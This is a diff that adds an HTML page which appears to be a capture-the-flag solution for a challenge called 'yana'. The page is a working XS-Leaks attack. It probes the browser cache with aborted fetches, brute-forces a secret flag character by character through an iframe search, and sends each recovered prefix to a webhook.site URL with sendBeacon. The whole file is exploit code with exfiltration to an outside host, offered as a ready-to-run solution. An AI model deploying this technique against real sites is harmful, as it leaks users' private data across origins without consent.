@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>YANA Soln</title>
+  </head>
+  <body>
+    <h1>yana sol</h1>
+    <iframe id="x" src="about:blank"></iframe>
+    <script>
+      const params = new URLSearchParams(location.search);
+      const abortTime1 = parseInt(params.get("a"));
+      const abortTime2 = parseInt(params.get("b"));
+      // 3,9 appear to work well
+      const sleep = (ms) => new Promise(res => setTimeout(res, ms));
+      const frame = document.querySelector("#x");
+      // from: https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller
+      async function ifCached(url, purge = false) {
+          var controller = new AbortController();
+          var signal = controller.signal;
+          // After 9ms, abort the request (before the request was finished).
+          // The timeout might need to be adjusted for the attack to work properly.
+          // Purging content seems to take slightly less time than probing
+          var wait_time = (purge) ? abortTime1 : abortTime2;
+          var timeout = await setTimeout(() => {
+              controller.abort();
+          }, wait_time);
+          try {
+              // credentials option is needed for Firefox
+              let options = {
+                  mode: "no-cors",
+                  credentials: "include",
+                  signal: signal
+              };
+              // If the option "cache: reload" is set, the browser will purge
+              // the resource from the browser cache
+              if(purge) options.cache = "reload";
+
+              await fetch(url, options);
+          } catch (err) {
+              // When controller.abort() is called, the fetch will throw an Exception
+              if(purge) console.log("The resource was purged from the cache");
+              else console.log("The resource is not cached");
+              return false
+          }
+          // clearTimeout will only be called if this line was reached in less than
+          // wait_time which means that the resource must have arrived from the cache
+          clearTimeout(timeout);
+          console.log("The resource is cached");
+
+          return true;
+      }
+      
+      async function load(url) {
+        return new Promise(res => {
+          frame.onload = res;
+          frame.src = url;
+        });
+      }
+      
+      async function search(q) {
+        await load(`https://chal.yana.wtf/#${q}`);
+        await sleep(250);
+        await load("about:blank");
+        return await ifCached("https://sigpwny.com/uiuctf/y.jpg", false);
+      }
+      
+      async function main() {
+        await sleep(250);
+        navigator.sendBeacon(`http://127.0.0.1:8888?init=1&a=${abortTime1}&b=${abortTime2}`);
+        navigator.sendBeacon(`https://webhook.site/b2d0aba3-31be-4a6b-bc88-833efa211684?init=1&a=${abortTime1}&b=${abortTime2}`);
+        await ifCached("https://sigpwny.com/uiuctf/y.jpg", true); // purge y from cache
+        
+        let flag = "uiuctf{";
+        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
+        while (!flag.endsWith("}")) {
+          for (let c of charset) {
+            if (await search(flag+c)) {
+              await ifCached("https://sigpwny.com/uiuctf/y.jpg", true); // purge y from cache
+              flag = flag + c;
+              navigator.sendBeacon(`http://127.0.0.1:8888?${flag}`);
+              navigator.sendBeacon(`https://webhook.site/b2d0aba3-31be-4a6b-bc88-833efa211684?${flag}`);
+              break;
+            }
+          }
+        }
+      }
+      main();
+    </script>
+  </body>
+</html>
